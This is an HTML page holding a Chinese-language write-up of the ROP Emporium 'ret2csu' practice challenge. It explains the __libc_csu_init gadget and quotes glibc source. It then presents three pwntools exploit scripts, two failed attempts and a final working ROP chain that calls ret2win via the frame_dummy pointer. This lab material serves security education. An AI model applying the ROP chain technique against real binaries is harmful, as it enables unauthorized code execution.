@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html class="writer-html5" lang="zh-CN" >
+<head>
+  <meta charset="utf-8" /><meta name="generator" content="Docutils 0.17.1: http://docutils.sourceforge.net/" />
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>ret2csu &mdash; rop emporium writeup  文档</title>
+      <link rel="stylesheet" href="../_static/pygments.css" type="text/css" />
+      <link rel="stylesheet" href="../_static/css/theme.css" type="text/css" />
+  <!--[if lt IE 9]>
+    <script src="../_static/js/html5shiv.min.js"></script>
+  <![endif]-->
+  
+        <script data-url_root="../" id="documentation_options" src="../_static/documentation_options.js"></script>
+        <script src="../_static/jquery.js"></script>
+        <script src="../_static/underscore.js"></script>
+        <script src="../_static/doctools.js"></script>
+        <script src="../_static/translations.js"></script>
+    <script src="../_static/js/theme.js"></script>
+    <link rel="index" title="索引" href="../genindex.html" />
+    <link rel="search" title="搜索" href="../search.html" /> 
+</head>
+
+<body class="wy-body-for-nav"> 
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search" >
+            <a href="../index.html" class="icon icon-home"> rop emporium writeup
+          </a>
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
+    <input type="text" name="q" placeholder="在文档中搜索" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <!-- Local TOC -->
+              <div class="local-toc"><ul>
+<li><a class="reference internal" href="#">ret2csu</a><ul>
+<li><a class="reference internal" href="#same-same-but-different">Same same, but different</a></li>
+<li><a class="reference internal" href="#so-little-room-for-activities">So little room for activities</a></li>
+<li><a class="reference internal" href="#universal">Universal</a></li>
+</ul>
+</li>
+</ul>
+</div>
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../index.html">rop emporium writeup</a>
+      </nav>
+
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          <div role="navigation" aria-label="Page navigation">
+  <ul class="wy-breadcrumbs">
+      <li><a href="../index.html" class="icon icon-home"></a> &raquo;</li>
+      <li>ret2csu</li>
+      <li class="wy-breadcrumbs-aside">
+            <a href="../_sources/7_ret2csu/README.md.txt" rel="nofollow"> 查看页面源码</a>
+      </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+             
+  <section id="ret2csu">
+<h1>ret2csu<a class="headerlink" href="#ret2csu" title="永久链接至标题"></a></h1>
+<p>via：https://ropemporium.com/challenge/ret2csu.html</p>
+<p>We’re back in ret2win territory, but this time without the useful gadgets. How will we populate the rdx register without a pop rdx?
+Click below to download the binary.</p>
+<p><a class="reference external" href="https://ropemporium.com/binary/ret2csu.zip">64bit</a></p>
+<section id="same-same-but-different">
+<h2>Same same, but different<a class="headerlink" href="#same-same-but-different" title="永久链接至标题"></a></h2>
+<p>The challenge is simple: call the <strong>ret2win()</strong> function, the caveat this time is that the third argument (which you know by now is stored in the rdx register on x86_64 Linux) must be 0xdeadcafebabebeef. Populating this elusive register using ROP can prove more difficult than you might first think, especially in smaller binaries with fewer gadgets. This can become particularly irksome since many useful GLIBC functions require three arguments.</p>
+</section>
+<section id="so-little-room-for-activities">
+<h2>So little room for activities<a class="headerlink" href="#so-little-room-for-activities" title="永久链接至标题"></a></h2>
+<p>Start by using ropper to search for sensible gadgets, if there’s no pop rdx perhaps there’s a mov rdx, rbp that you could chain with a pop rbp. You might consider avoiding the issue entirely by returning to the fgets() code within the pwnme() function but this may prove to be difficult since the .got.plt entries of fgets() and some other functions have been tampered. If you’re all out of ideas go ahead and read the last section.</p>
+</section>
+<section id="universal">
+<h2>Universal<a class="headerlink" href="#universal" title="永久链接至标题"></a></h2>
+<p>Fortunately some very smart people have come up with a solution to your problem and as is customary in infosec given it a collection of pretentious names, including “Universal ROP”, “μROP”, “return-to-csu” or just “ret2csu”. You can learn all you need to on the subject from these <a class="reference external" href="https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf">BlackHat Asia slides</a>. Note that more recent versions of gcc may use different registers from the example in __libc_csu_init(), including the version that compiled this challenge.</p>
+<p>所谓的 ret2csu 就是跳到  <code class="docutils literal notranslate"><span class="pre">__libc_csu_init()</span></code>  执行，其实就是一个在编译的时候加进来的函数</p>
+<p><img alt="image-20200504035408965" src="../_images/image-20200504035408965.png" /></p>
+<div class="highlight-asm notranslate"><div class="highlight"><pre><span></span>                    LAB_00400880                      XREF[1]: 00400894(j)  
+   00400880 4c 89 fa   MOV     RDX,R15
+   00400883 4c 89 f6   MOV     RSI,R14
+   00400886 44 89 ef   MOV     EDI,R13D
+   00400889 41 ff      CALL    qword ptr [R12 + RBX*0x8]=&gt;-&gt;fra  undefined frame_dummy()
+            14 dc                                                = 4006D0h
+                                                                 = 4006A0h
+                                                                 undefined __do_global_
+   0040088d 48 83      ADD     RBX,0x1
+            c3 01
+   00400891 48 39 dd   CMP     RBP,RBX
+   00400894 75 ea      JNZ     LAB_00400880
+                    LAB_00400896                      XREF[1]: 00400874(j)  
+   00400896 48 83      ADD     RSP,0x8
+            c4 08
+   0040089a 5b         POP     RBX
+   0040089b 5d         POP     RBP
+   0040089c 41 5c      POP     R12
+   0040089e 41 5d      POP     R13
+   004008a0 41 5e      POP     R14
+   004008a2 41 5f      POP     R15
+   004008a4 c3         RET
+</pre></div>
+</div>
+<p>可控 rbx，rbp，r12，r13，r14，r15</p>
+<p>然后 <code class="docutils literal notranslate"><span class="pre">r15</span></code> 可以设置 <code class="docutils literal notranslate"><span class="pre">rdx</span></code>，<code class="docutils literal notranslate"><span class="pre">r14</span></code> 可以设置 <code class="docutils literal notranslate"><span class="pre">rsi</span></code>，<code class="docutils literal notranslate"><span class="pre">r13</span></code> 可以设置 <code class="docutils literal notranslate"><span class="pre">edi</span></code></p>
+<p>看官方的描述其实就是想让我们把 <code class="docutils literal notranslate"><span class="pre">rdx</span></code> 设置成 <code class="docutils literal notranslate"><span class="pre">0xdeadcafebabebeef</span></code> 然后调用 <code class="docutils literal notranslate"><span class="pre">ret2win</span></code></p>
+<p>现在 gadget 有了试一下写 payload：</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">ret2csu</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./ret2csu&quot;</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&quot;./ret2csu&quot;</span><span class="p">)</span>
+
+<span class="n">ret2win</span> <span class="o">=</span> <span class="n">ret2csu</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&quot;ret2win&quot;</span><span class="p">]</span>
+
+<span class="n">pop_rbx_rbp_r12_r13_r14_r15_ret</span> <span class="o">=</span> <span class="mh">0x0040089a</span>
+<span class="n">mov_rdx_r15_mov_rsi_r14_mov_edi_r13D_call_r12_rbx</span> <span class="o">=</span> <span class="mh">0x00400880</span>
+
+<span class="n">exp</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mh">0x28</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rbx_rbp_r12_r13_r14_r15_ret</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1">#rbx</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1">#rbp</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret2win</span><span class="p">)</span> <span class="c1">#r12</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1">#r13</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1">#r14</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadcafebabebeef</span><span class="p">)</span> <span class="c1">#r15</span>
+
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">mov_rdx_r15_mov_rsi_r14_mov_edi_r13D_call_r12_rbx</span><span class="p">)</span>
+
+<span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">pidof</span><span class="p">(</span><span class="n">p</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">exp</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+</div>
+<p>失败</p>
+<p>仔细理了理，发现还有一个地方错了</p>
+<div class="highlight-asm notranslate"><div class="highlight"><pre><span></span>   00400889 41 ff      CALL    qword ptr [R12 + RBX*0x8]=&gt;-&gt;fra  undefined frame_dummy()
+</pre></div>
+</div>
+<p>当时没仔细看，我以为 r12 放 ret2win 的地址，rbx 置 0 就能 call ret2win</p>
+<p>其实这个是要解引用的，把真正的函数地址放进去肯定是不能解引用出函数地址的，然后就是，想着什么地方的地址解引用后能得到一个函数的地址，一开始想到的是 got 表，随便找一个 libc 库函数，绕过 <code class="docutils literal notranslate"><span class="pre">CALL</span>&#160;&#160;&#160; <span class="pre">qword</span> <span class="pre">ptr</span> <span class="pre">[R12</span> <span class="pre">+</span> <span class="pre">RBX*0x8]</span></code> 和 <code class="docutils literal notranslate"><span class="pre">ADD</span>&#160;&#160;&#160;&#160; <span class="pre">RBX,0x1</span> </code> <code class="docutils literal notranslate"> <span class="pre">CMP</span>&#160;&#160;&#160;&#160; <span class="pre">RBP,RBX</span></code> 一直到 ret 才把 ret2win 的地址放到栈上去，这个过程一定要保证，rbx 的值不会被修改，不然不能成功调用 ret2win</p>
+<p>绕过  <code class="docutils literal notranslate"><span class="pre">CALL</span>&#160;&#160;&#160; <span class="pre">qword</span> <span class="pre">ptr</span> <span class="pre">[R12</span> <span class="pre">+</span> <span class="pre">RBX*0x8]</span> </code> 我把 r12 放 puts 的 got 然后 rbx 放 0</p>
+<p>这样就能绕过了，然后 把 rbp 置 1 就能绕过 <code class="docutils literal notranslate"><span class="pre">ADD</span>&#160;&#160;&#160;&#160; <span class="pre">RBX,0x1</span> </code> <code class="docutils literal notranslate"> <span class="pre">CMP</span>&#160;&#160;&#160;&#160; <span class="pre">RBP,RBX</span></code></p>
+<p>payload：</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">ret2csu</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./ret2csu&quot;</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&quot;./ret2csu&quot;</span><span class="p">)</span>
+
+<span class="n">ret2win</span> <span class="o">=</span> <span class="n">ret2csu</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&quot;ret2win&quot;</span><span class="p">]</span>
+
+<span class="n">fgets_got</span> <span class="o">=</span> <span class="n">ret2csu</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s2">&quot;fgets&quot;</span><span class="p">]</span>
+<span class="n">add_rsp_8_pop_rbx_rbp_r12_r13_r14_r15_ret</span> <span class="o">=</span> <span class="mh">0x00400896</span>
+<span class="n">mov_rdx_r15_mov_rsi_r14_mov_edi_r13D_call_r12_rbx</span> <span class="o">=</span> <span class="mh">0x00400880</span>
+
+<span class="n">exp</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mh">0x28</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">add_rsp_8_pop_rbx_rbp_r12_r13_r14_r15_ret</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># padding (add rsp,8)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># rbx</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># rbp</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">fgets_got</span><span class="p">)</span> <span class="c1"># r12</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># r13</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># r14</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadcafebabebeef</span><span class="p">)</span> <span class="c1"># r15</span>
+
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">mov_rdx_r15_mov_rsi_r14_mov_edi_r13D_call_r12_rbx</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1">#rbx</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1">#rbp</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1">#r12</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1">#r13</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1">#r14</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1">#r15</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret2win</span><span class="p">)</span>
+
+<span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">pidof</span><span class="p">(</span><span class="n">p</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">exp</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+</div>
+<p>不应该啊，参数对了，地址对了，为什么最后却是跳到 0 去了</p>
+<p><img alt="image-20200504135510082" src="../_images/image-20200504135510082.png" /></p>
+<p>想到官方的话：</p>
+<p>You might consider avoiding the issue entirely by returning to the fgets() code within the pwnme() function but this may prove to be difficult since the .got.plt entries of fgets() and some other functions have been tampered. If you’re all out of ideas go ahead and read the last section.</p>
+<p>一看</p>
+<p><img alt="image-20200504043215523" src="../_images/image-20200504043215523.png" /></p>
+<p><img alt="image-20200504043414229" src="../_images/image-20200504043414229.png" /></p>
+<p><img alt="image-20200504042703923" src="../_images/image-20200504042703923.png" /></p>
+<p>我***</p>
+<p>把 got 表上 puts , printf， memset， fgets 表项全置 0</p>
+<p>？？？？？？？？？？？？？？？？？？？？？？</p>
+<p>剩下一个 <code class="docutils literal notranslate"><span class="pre">setvbuf</span></code></p>
+<p>试一试</p>
+<p>能调用</p>
+<p><img alt="image-20200504135948497" src="../_images/image-20200504135948497.png" /></p>
+<p>但是这个函数会改变 edx 的值，在调用 ret2win 的时候会失败</p>
+<p>如果很了解 elf 的格式的话，直接就知道</p>
+<p><img alt="image-20200504142142144" src="../_images/image-20200504142142144.png" /></p>
+<p><code class="docutils literal notranslate"><span class="pre">.init_array</span></code> 段在 glibc 里面是怎么处理的</p>
+<p>via：https://code.woboq.org/userspace/glibc/csu/elf-init.c.html</p>
+<div class="highlight-c notranslate"><div class="highlight"><pre><span></span><span class="cm">/* Startup support for ELF initializers/finalizers in the main executable.</span>
+<span class="cm">   Copyright (C) 2002-2019 Free Software Foundation, Inc.</span>
+<span class="cm">   This file is part of the GNU C Library.</span>
+<span class="cm">   The GNU C Library is free software; you can redistribute it and/or</span>
+<span class="cm">   modify it under the terms of the GNU Lesser General Public</span>
+<span class="cm">   License as published by the Free Software Foundation; either</span>
+<span class="cm">   version 2.1 of the License, or (at your option) any later version.</span>
+<span class="cm">   In addition to the permissions in the GNU Lesser General Public</span>
+<span class="cm">   License, the Free Software Foundation gives you unlimited</span>
+<span class="cm">   permission to link the compiled version of this file with other</span>
+<span class="cm">   programs, and to distribute those programs without any restriction</span>
+<span class="cm">   coming from the use of this file. (The GNU Lesser General Public</span>
+<span class="cm">   License restrictions do apply in other respects; for example, they</span>
+<span class="cm">   cover modification of the file, and distribution when not linked</span>
+<span class="cm">   into another program.)</span>
+<span class="cm">   Note that people who make modified versions of this file are not</span>
+<span class="cm">   obligated to grant this special exception for their modified</span>
+<span class="cm">   versions; it is their choice whether to do so. The GNU Lesser</span>
+<span class="cm">   General Public License gives permission to release a modified</span>
+<span class="cm">   version without this exception; this exception also makes it</span>
+<span class="cm">   possible to release a modified version which carries forward this</span>
+<span class="cm">   exception.</span>
+<span class="cm">   The GNU C Library is distributed in the hope that it will be useful,</span>
+<span class="cm">   but WITHOUT ANY WARRANTY; without even the implied warranty of</span>
+<span class="cm">   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU</span>
+<span class="cm">   Lesser General Public License for more details.</span>
+<span class="cm">   You should have received a copy of the GNU Lesser General Public</span>
+<span class="cm">   License along with the GNU C Library; if not, see</span>
+<span class="cm">   &lt;http://www.gnu.org/licenses/&gt;.  */</span>
+<span class="cp">#include</span> <span class="cpf">&lt;stddef.h&gt;</span><span class="cp"></span>
+<span class="cm">/* These magic symbols are provided by the linker.  */</span>
+<span class="k">extern</span> <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">__preinit_array_start</span> <span class="p">[])</span> <span class="p">(</span><span class="kt">int</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="p">)</span>
+  <span class="n">attribute_hidden</span><span class="p">;</span>
+<span class="k">extern</span> <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">__preinit_array_end</span> <span class="p">[])</span> <span class="p">(</span><span class="kt">int</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="p">)</span>
+  <span class="n">attribute_hidden</span><span class="p">;</span>
+<span class="k">extern</span> <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">__init_array_start</span> <span class="p">[])</span> <span class="p">(</span><span class="kt">int</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="p">)</span>
+  <span class="n">attribute_hidden</span><span class="p">;</span>
+<span class="k">extern</span> <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">__init_array_end</span> <span class="p">[])</span> <span class="p">(</span><span class="kt">int</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="p">)</span>
+  <span class="n">attribute_hidden</span><span class="p">;</span>
+<span class="k">extern</span> <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">__fini_array_start</span> <span class="p">[])</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="n">attribute_hidden</span><span class="p">;</span>
+<span class="k">extern</span> <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">__fini_array_end</span> <span class="p">[])</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="n">attribute_hidden</span><span class="p">;</span>
+<span class="cp">#ifndef NO_INITFINI</span>
+<span class="cm">/* These function symbols are provided for the .init/.fini section entry</span>
+<span class="cm">   points automagically by the linker.  */</span>
+<span class="k">extern</span> <span class="kt">void</span> <span class="nf">_init</span> <span class="p">(</span><span class="kt">void</span><span class="p">);</span>
+<span class="k">extern</span> <span class="kt">void</span> <span class="nf">_fini</span> <span class="p">(</span><span class="kt">void</span><span class="p">);</span>
+<span class="cp">#endif</span>
+<span class="cm">/* These functions are passed to __libc_start_main by the startup code.</span>
+<span class="cm">   These get statically linked into each program.  For dynamically linked</span>
+<span class="cm">   programs, this module will come from libc_nonshared.a and differs from</span>
+<span class="cm">   the libc.a module in that it doesn&#39;t call the preinit array.  */</span>
+<span class="kt">void</span>
+<span class="nf">__libc_csu_init</span> <span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="cm">/* For dynamically linked executables the preinit array is executed by</span>
+<span class="cm">     the dynamic linker (before initializing any shared object).  */</span>
+<span class="cp">#ifndef LIBC_NONSHARED</span>
+  <span class="cm">/* For static executables, preinit happens right before init.  */</span>
+  <span class="p">{</span>
+    <span class="k">const</span> <span class="kt">size_t</span> <span class="n">size</span> <span class="o">=</span> <span class="n">__preinit_array_end</span> <span class="o">-</span> <span class="n">__preinit_array_start</span><span class="p">;</span>
+    <span class="kt">size_t</span> <span class="n">i</span><span class="p">;</span>
+    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">size</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+      <span class="p">(</span><span class="o">*</span><span class="n">__preinit_array_start</span> <span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="p">(</span><span class="n">argc</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
+  <span class="p">}</span>
+<span class="cp">#endif</span>
+<span class="cp">#ifndef NO_INITFINI</span>
+  <span class="n">_init</span> <span class="p">();</span>
+<span class="cp">#endif</span>
+  <span class="k">const</span> <span class="kt">size_t</span> <span class="n">size</span> <span class="o">=</span> <span class="n">__init_array_end</span> <span class="o">-</span> <span class="n">__init_array_start</span><span class="p">;</span>
+  <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">size</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+      <span class="p">(</span><span class="o">*</span><span class="n">__init_array_start</span> <span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="p">(</span><span class="n">argc</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="cm">/* This function should not be used anymore.  We run the executable&#39;s</span>
+<span class="cm">   destructor now just like any other.  We cannot remove the function,</span>
+<span class="cm">   though.  */</span>
+<span class="kt">void</span>
+<span class="nf">__libc_csu_fini</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="cp">#ifndef LIBC_NONSHARED</span>
+  <span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="n">__fini_array_end</span> <span class="o">-</span> <span class="n">__fini_array_start</span><span class="p">;</span>
+  <span class="k">while</span> <span class="p">(</span><span class="n">i</span><span class="o">--</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
+    <span class="p">(</span><span class="o">*</span><span class="n">__fini_array_start</span> <span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="p">();</span>
+<span class="cp"># ifndef NO_INITFINI</span>
+  <span class="n">_fini</span> <span class="p">();</span>
+<span class="cp"># endif</span>
+<span class="cp">#endif</span>
+<span class="p">}</span>
+</pre></div>
+</div>
+<p>看到了吗，<code class="docutils literal notranslate"><span class="pre">__libc_csu_fini</span></code> , <code class="docutils literal notranslate"><span class="pre">__libc_csu_init</span></code> 的源码</p>
+<p>不深究，自己看源码吧</p>
+<p><img alt="image-20200504143608690" src="../_images/image-20200504143608690.png" /></p>
+<p>发现有一个 函数指针</p>
+<p>地址：<code class="docutils literal notranslate"><span class="pre">0x00600e10</span></code></p>
+<p>解引用后：   <code class="docutils literal notranslate"><span class="pre">0x4006d0</span></code></p>
+<p>调用 <code class="docutils literal notranslate"><span class="pre">frame_dummy</span></code> 函数，试试看</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">ret2csu</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./ret2csu&quot;</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&quot;./ret2csu&quot;</span><span class="p">)</span>
+
+<span class="n">ret2win</span> <span class="o">=</span> <span class="n">ret2csu</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&quot;ret2win&quot;</span><span class="p">]</span>
+<span class="n">frame_dummy_ptr</span> <span class="o">=</span> <span class="mh">0x00600e10</span>
+<span class="n">add_rsp_8_pop_rbx_rbp_r12_r13_r14_r15_ret</span> <span class="o">=</span> <span class="mh">0x00400896</span>
+<span class="n">mov_rdx_r15_mov_rsi_r14_mov_edi_r13D_call_r12_rbx</span> <span class="o">=</span> <span class="mh">0x00400880</span>
+
+<span class="n">exp</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mh">0x28</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">add_rsp_8_pop_rbx_rbp_r12_r13_r14_r15_ret</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1">#rbx</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1">#rbp</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">frame_dummy_ptr</span><span class="p">)</span> <span class="c1">#r12</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1">#r13</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1">#r14</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadcafebabebeef</span><span class="p">)</span> <span class="c1">#r15</span>
+
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">mov_rdx_r15_mov_rsi_r14_mov_edi_r13D_call_r12_rbx</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1">#rbx</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1">#rbp</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1">#r12</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1">#r13</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1">#r14</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1">#r15</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret2win</span><span class="p">)</span>
+
+<span class="c1"># gdb.attach(pidof(p)[0])</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">exp</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+</div>
+<p>pwn!</p>
